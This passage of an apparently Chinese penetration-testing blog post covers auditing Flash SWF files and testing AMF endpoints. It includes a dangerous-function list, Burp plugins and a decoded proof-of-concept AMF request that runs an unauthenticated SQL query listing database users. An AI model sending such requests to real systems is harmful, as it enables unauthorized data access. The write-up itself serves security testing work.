    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 id="1下载swf文件" class="heading-element"><span><strong>1、下载swf文件</strong></span>
  <a href="#1%e4%b8%8b%e8%bd%bdswf%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>我日常使用Burp进行渗透测试，用其他的代理抓包工具效果也是一样的。</p>
<p>抓包找到下载swf文件的连接，在Burp中右键另存为，保存到本地的xxx.swf文件。也可以使用wget/curl直接下载</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget &lt;url&gt;
</span></span><span class="line"><span class="cl">curl &lt;url&gt; --output xxx.swf</span></span></code></pre></td></tr></table>
</div>
</div><p>根据网站架构，有些可能是一个主界面swf去加载子模块swf，有些就是单独的swf，可能要下载的文件比较多。</p>
<h4 id="2反编译-swf-文件" class="heading-element"><span><strong>2、反编译 swf 文件</strong></span>
  <a href="#2%e5%8f%8d%e7%bc%96%e8%af%91-swf-%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>使用 JPEXS Free Flash Decompiler（ffdec）打开该swf文件进行反编译。</p>
<p>反编译后页面如下，软件默认是英文页面，可以在 “setting” - “change language” 处修改为简中。</p>
<p><a class="lightgallery" href="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817152104211.png?size=large" data-thumbnail="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817152104211.png?size=small" data-sub-html="<h2>image-20250817152104211</h2>"><img loading="lazy" src="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817152104211.png" alt="image-20250817152104211" srcset="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817152104211.png?size=small, /posts/case-flash_swf_amf_test/resource/index.assets/image-20250817152104211.png?size=medium 1.5x, /posts/case-flash_swf_amf_test/resource/index.assets/image-20250817152104211.png?size=large 2x" data-title="image-20250817152104211" style="--width: 2236px;--aspect-ratio: 2236 / 1400;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p><strong>导出文件</strong></p>
<p>虽然 ffdec 支持查看和修改 actionScript 代码文件，但是还是建议将文件导出到本地统一进行审计比较方便。</p>
<p>导出方式非常朴素，<code>Ctrl + A</code> 全选后，右键导出已选，保存到指定目录中</p>
<p>也可以通过导出功能，导出为 VS Code 工程 或 IDEA工程，区别应该不大。</p>
<p><a class="lightgallery" href="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817153629891.png?size=large" data-thumbnail="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817153629891.png?size=small" data-sub-html="<h2>image-20250817153629891</h2>"><img loading="lazy" src="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817153629891.png" alt="image-20250817153629891" srcset="/posts/case-flash_swf_amf_test/resource/index.assets/image-20250817153629891.png?size=small, /posts/case-flash_swf_amf_test/resource/index.assets/image-20250817153629891.png?size=medium 1.5x, /posts/case-flash_swf_amf_test/resource/index.assets/image-20250817153629891.png?size=large 2x" data-title="image-20250817153629891" style="--width: 2228px;--aspect-ratio: 2228 / 442;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h4 id="3代码审计" class="heading-element"><span>3、代码审计</span>
  <a href="#3%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p><strong>自动审计</strong></p>
<p>可通过 fortify 进行代码审计</p>
<p><strong>手动审计</strong></p>
<ol>
<li>
<p>查找敏感信息：密码hash、AccessToken、AccessKey、敏感词、API接口、URI等信息</p>
<p>参考文章中有用 <a href="https://github.com/gwen001/extract-endpoints"target="_blank" rel="external nofollow noopener noreferrer">extract-endpoints</a> 的： 这个 PHP 工具会对文件或递归地对目录应用正则表达式，以提取端点。这对于从 JavaScript 文件中查找 API 网址非常有用。但是，所有类型的源文件都可以被解析（HTML、PHP、JavaScript、Java 等）。</p>
<p>我用的是自己基于 HAE 正则写的小脚本，用来挖掘敏感信息的。</p>
</li>
<li>
<p>查找危险函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadVariables</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">getURL</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">getURLBlankVar</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">getURLParentVar</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">getURLJSParam</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">loadMovie</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">loadMovieVar</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">loadMovieNum</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">FScrollPane</span><span class="o">.</span><span class="n">loadScrollContent</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">LoadVars</span><span class="o">.</span><span class="n">load</span> 
</span></span><span class="line"><span class="cl"><span class="n">LoadVars</span><span class="o">.</span><span class="n">send</span> 
</span></span><span class="line"><span class="cl"><span class="n">XML</span><span class="o">.</span><span class="n">load</span> <span class="p">(</span> <span class="s1">&#39;url&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">XML</span><span class="o">.</span><span class="n">sendAndLoad</span> <span class="p">(</span> <span class="s1">&#39;url&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">LoadVars</span><span class="o">.</span><span class="n">load</span> <span class="p">(</span> <span class="s1">&#39;url&#39;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">LoadVars</span><span class="o">.</span><span class="n">send</span> <span class="p">(</span> <span class="s1">&#39;url&#39;</span> <span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">Sound</span><span class="o">.</span><span class="n">loadSound</span><span class="p">(</span> <span class="s1">&#39;url&#39;</span> <span class="p">,</span> <span class="n">isStreaming</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">NetStream</span><span class="o">.</span><span class="n">play</span><span class="p">(</span> <span class="s1">&#39;url&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">flash</span><span class="o">.</span><span class="n">external</span><span class="o">.</span><span class="n">ExternalInterface</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">_root</span><span class="o">.</span><span class="n">callback</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">externalInterface</span><span class="o">.</span><span class="n">addCallback</span>
</span></span><span class="line"><span class="cl"><span class="n">htmlText</span>
</span></span><span class="line"><span class="cl"><span class="n">htmlVar</span>
</span></span><span class="line"><span class="cl"><span class="n">loadClip</span>
</span></span><span class="line"><span class="cl"><span class="n">AddDLL</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>跟着函数找调用路径</p>
</li>
</ol>
<h4 id="4漏洞验证" class="heading-element"><span>4、漏洞验证</span>
  <a href="#4%e6%bc%8f%e6%b4%9e%e9%aa%8c%e8%af%81" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>对代码审计的结果进行验证，其实也可以算作代审中的一步。</p>
<p>通过Flash浏览器，配合 ffdec 的调试功能进行验证。</p>
<h2 id="amf渗透" class="heading-element"><span>AMF渗透</span>
  <a href="#amf%e6%b8%97%e9%80%8f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>[[AMF渗透测试]]</p>
<p>AMF（Action Message Format）是一种二进制的数据格式，即数据（actionscript里面的Object, Array, Boolean, Number等）经过了序列化成二进制。</p>
<ul>
<li>AMF 是 Adobe 提出的二进制序列化协议</li>
<li>主要用于 Flash/Flex 和服务器间高效传输数据</li>
<li>支持复杂对象、数组、XML、日期等数据类型</li>
</ul>
<p>AMF基于HTTP协议，服务端大致处理过程：</p>
<ol>
<li>HTTP Request：服务端接收到来自客户端的http请求（request），并从中获取请求体内容（AMF数据）</li>
<li>反序列化：服务端将请求体内容（AMF数据）反序列化为 ActionScript 对象</li>
<li>处理请求：服务端根据请 ActionScript 对象处理请求，调用执行相应的服务、方法，根据相应的服务、方法的定义，返回执行结果（也是ActionScript 对象）</li>
<li>序列化：将处理结果（ActionScript 对象）序列化为响应体内容（AMF数据）</li>
<li>HTTP Response：服务器返回http响应（response）给客户端</li>
</ol>
<h3 id="测试工具-1" class="heading-element"><span>测试工具</span>
  <a href="#%e6%b5%8b%e8%af%95%e5%b7%a5%e5%85%b7-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>主要是对AMF数据进行序列化反序列化的用途，下面是一些Burp的插件</p>
<ul>
<li><a href="https://github.com/nccgroup/AMFDSer-ngng"target="_blank" rel="external nofollow noopener noreferrer">AMFDSer-ngng</a></li>
<li><a href="https://github.com/ConnorSnee/AMFDserBurp2020-12"target="_blank" rel="external nofollow noopener noreferrer">AMFDserBurp2020-12</a> 用于让Burp与Flash应用程序协同工作的Burp扩展。</li>
<li><a href="https://github.com/khai-tran/BurpAMFDser"target="_blank" rel="external nofollow noopener noreferrer">BurpAMFDser</a>：它借助<a href="http://xstream.codehaus.org/"target="_blank" rel="external nofollow noopener noreferrer">Xtream库</a>实现AMF请求和响应与XML之间的反序列化。还使用了Kenneth Hill的<a href="https://github.com/steeltomato/jmeter-amf"target="_blank" rel="external nofollow noopener noreferrer">JMeter源代码</a>的一部分来进行自定义AMF反序列化</li>
<li><a href="https://github.com/ikkisoft/blazer"target="_blank" rel="external nofollow noopener noreferrer">blazer</a>：一款具有模糊测试功能的自定义AMF消息生成器，作为Burp Suite插件可用于生成和模糊测试自定义AMF消息。    <em>测试过程中，插件没正常运行</em></li>
</ul>
<p>MFDser系列我在使用中都遇到了相同的问题，即有些数据包 反序列化解码返回为空，工具会出现报异常。类似 <a href="https://github.com/nccgroup/AMFDSer-ngng/issues/2"target="_blank" rel="external nofollow noopener noreferrer">相关issue:</a></p>
<p>反序列化并编码为xml的效果</p>
<div class="alert alert-note"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/></svg>注意</p><p>普遍这些工具都比较老，现在是2025年了，Flash、AMF大概在2018年比较流行，这些插件可能也有一些适配性上的问题。</p>
<p>至于要不要对这些插件进行优化，再说吧……(🕊咕咕咕~)</p></div><h3 id="实战案例" class="heading-element"><span>实战案例</span>
  <a href="#%e5%ae%9e%e6%88%98%e6%a1%88%e4%be%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>首先要理解AMF是一种序列化后的数据传输格式，所以存在什么漏洞取决于传递了什么数据，它和平时常用的<code>key=value</code>模式本质上是一样的，因此很多漏洞也是相近的。</p>
<p>部分案例见这篇参考文章：<a href="https://xz.aliyun.com/news/7994"target="_blank" rel="external nofollow noopener noreferrer">谈谈AMF网站的渗透测试</a>：用户名枚举、敏感信息泄露、SQL注入、未授权访问、文件删除。</p>
<p>接下去我挑一下我遇到的漏洞：</p>
<div class="alert alert-warning"><p class="alert-title"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z"/></svg>警告</p><p><em>坏了，我的测试记录上都是水印，等我脱敏下</em></p>
<p>其实写到这的时候感觉没啥好写的，AMF的难点就在对传输数据进行解码，后面的漏洞都比较普通，和正常Web一样。</p></div><h4 id="未授权sql执行" class="heading-element"><span>未授权SQL执行</span>
  <a href="#%e6%9c%aa%e6%8e%88%e6%9d%83sql%e6%89%a7%e8%a1%8c" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>这个漏洞很好理解，网站定义了一个接口能执行SQL语句，AMF数据解码后就可以任意修改了，没有任何限制，相当于接管了SQL执行功能。而且这个功能可以未授权访问，删除Cookie、Token等认证字段后也能获取到数据。</p>
<p>POC 反序列化解码后如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">POST /AtomLocal/messagebroker/amf HTTP/1.1
</span></span><span class="line"><span class="cl">Host: xxxxxxx
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">Content-Length: 842
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;ActionMessage&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>3<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;headers/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;bodies&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;MessageBody&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;targetURI&gt;</span>null<span class="nt">&lt;/targetURI&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;responseURI&gt;</span>null<span class="nt">&lt;/responseURI&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;data</span> <span class="na">class=</span><span class="s">&#34;object-array&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;RemotingMessage&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;destination&gt;</span>manager<span class="nt">&lt;/destination&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;messageId&gt;</span>BA53BCCF-2AD0-1027-D6C2-9C5702AB6F35<span class="nt">&lt;/messageId&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;timestamp&gt;</span>0<span class="nt">&lt;/timestamp&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;timeToLive&gt;</span>0<span class="nt">&lt;/timeToLive&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;operation&gt;</span>searchByParam<span class="nt">&lt;/operation&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;parameters&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;ASObject</span> <span class="na">serialVer=</span><span class="s">&#34;1&#34;</span> <span class="na">objClass=</span><span class="s">&#34;com.fsc.base.model.lookup.LookupJsonModel&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="nt">&lt;entry&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;string&gt;</span>key<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;string&gt;</span>select username from all_users<span class="nt">&lt;/string&gt;</span>
</span></span><span class="line"><span class="cl">              <span class="nt">&lt;/entry&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/ASObject&gt;</span>
</span></span><span class="line"><span class="cl">          <span class="nt">&lt;/parameters&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/RemotingMessage&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;/data&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/MessageBody&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/bodies&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/ActionMessage&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><p>对这个请求体的一些解释：</p>
<blockquote>
<p>这段 HTTP 请求包是基于<strong>AMF（Action Message Format）协议</strong>的远程调用消息，通常用于 Flex/Flash 客户端与服务器之间的通信。它本质上是一个序列化后的 ActionScript 对象，用于调用服务器端的方法并传递参数，具体解析如下：</p>
<h5 id="整体结构说明" class="heading-element"><span>整体结构说明</span>
  <a href="#%e6%95%b4%e4%bd%93%e7%bb%93%e6%9e%84%e8%af%b4%e6%98%8e" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><p>整个消息以<code>&lt;ActionMessage&gt;</code>为根节点，符合 AMF3 协议的消息格式规范，包含版本信息、消息头、消息体三部分：</p>
<ul>
<li><code>&lt;version&gt;3&lt;/version&gt;</code>：标识使用 AMF3 协议（AMF 有 AMF0 和 AMF3 两个版本，3 版本支持更多数据类型）。</li>
<li><code>&lt;headers/&gt;</code>：消息头部分，此处为空（可用于传递附加信息如认证令牌、超时设置等）。</li>
<li><code>&lt;bodies&gt;</code>：消息体部分，包含实际的远程调用内容（一个或多个<code>&lt;MessageBody&gt;</code>）。</li>
</ul>
<h5 id="核心内容解析messagebody部分" class="heading-element"><span>核心内容解析（<code>&lt;MessageBody&gt;</code>部分）</span>
  <a href="#%e6%a0%b8%e5%bf%83%e5%86%85%e5%ae%b9%e8%a7%a3%e6%9e%90messagebody%e9%83%a8%e5%88%86" class="heading-mark">
